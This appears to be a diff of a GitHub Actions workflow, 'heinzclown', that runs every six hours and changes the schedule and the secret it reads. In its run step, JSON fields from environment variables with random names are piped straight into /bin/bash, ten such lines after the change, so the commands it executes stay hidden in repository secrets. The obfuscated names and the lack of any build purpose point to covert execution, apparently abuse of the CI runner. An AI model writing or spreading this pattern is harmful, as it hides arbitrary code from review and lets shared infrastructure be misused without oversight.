@@ -1,8 +1,9 @@
 name: heinzclown
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 1/6 * * *'
+    - cron: '9 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,12 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: heinzclown
         env:
-          oubu97482: ${{ secrets.oubu97482 }}
+          cufr97: ${{ secrets.cufr97 }}
         run: |
-          echo $oubu97482 | jq -r .nbih2 | /bin/bash
-          echo $lork6158 | jq -r .wmgqh546 | /bin/bash
-          echo $zny37 | jq -r .wank625 | /bin/bash
-          echo $c60 | jq -r .pzyr59040 | /bin/bash
-          echo $bw87539 | jq -r .kdzpc49726 | /bin/bash
-          echo $xxf60979 | jq -r .mbemv555 | /bin/bash
+          echo $cufr97 | jq -r .ysfeb0521 | /bin/bash
+          echo $ims08644 | jq -r .eb5007 | /bin/bash
+          echo $vrrep8157 | jq -r .mvbvv27 | /bin/bash
+          echo $ab5 | jq -r .ohube8506 | /bin/bash
+          echo $z0 | jq -r .mru3364 | /bin/bash
+          echo $v8 | jq -r .uola49 | /bin/bash
+          echo $j47927 | jq -r .fhuj49 | /bin/bash
+          echo $pkb38 | jq -r .snhh2 | /bin/bash
+          echo $k1 | jq -r .hdtd448 | /bin/bash
+          echo $jzy2 | jq -r .do20 | /bin/bash
 
